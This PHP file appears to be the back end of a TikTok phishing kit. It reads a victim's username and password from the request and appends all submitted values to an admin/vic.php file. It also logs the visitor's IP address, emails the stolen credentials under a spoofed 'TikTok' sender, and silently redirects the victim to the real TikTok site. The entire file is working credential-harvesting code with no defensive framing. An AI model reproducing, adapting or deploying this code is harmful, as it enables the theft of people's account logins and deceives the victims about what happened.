<?php
include ('admin/config.php');
$headers = "From: mr.kanhan@gmail.com";
$headers.= "Content-type: text/html";
$success = mail($mailto, $subjek, $body, $headers);
$handle = fopen("admin/vic.php", "a");
foreach ($_GET as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
    fwrite($handle, $value);
    fwrite($handle, "");
}
fwrite($handle, "");
fclose($handle);
$bilsmg.= "</center> <center><br>";
$file = fopen("admin/vic.php", "a");
fwrite($file, $bilsmg);
fclose($file);
$line = date('Y-m-d H:i:s') . " - $_SERVER[REMOTE_ADDR]";
file_put_contents('admin/VisitorsIP.log', $line . PHP_EOL, FILE_APPEND);
?>

<?php
$username = $_GET['username'];
$password = $_GET['password'];
?>

<?php
include ('admin/config.php');
$url = "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
$subjek = "TikTok $username";
$body = <<<EOD

Username   =   $username
Password   =   $password

Coming from   = $url
</div>
EOD;
$headers = "From: TikTok <mr.kanhan@gmail.com>";
$headers.= "";
$success = mail($result, $subjek, $body, $headers);
?>
<meta http-equiv="Refresh" content="0; url=https://www.tiktok.com/">